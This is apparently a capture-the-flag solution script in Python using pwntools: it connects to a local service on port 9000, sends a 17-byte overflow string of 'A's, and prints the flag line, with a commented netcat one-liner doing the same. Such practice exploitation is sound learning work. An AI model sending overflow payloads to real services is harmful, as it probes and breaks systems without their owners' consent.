#python -c "print('A'*17)" | nc localhost 9000
from pwn import *

r = remote("localhost", 9000)

exploit = 'A'*17

r.sendline(exploit)
r.recvuntil('flag!\n')
print(r.recvline())
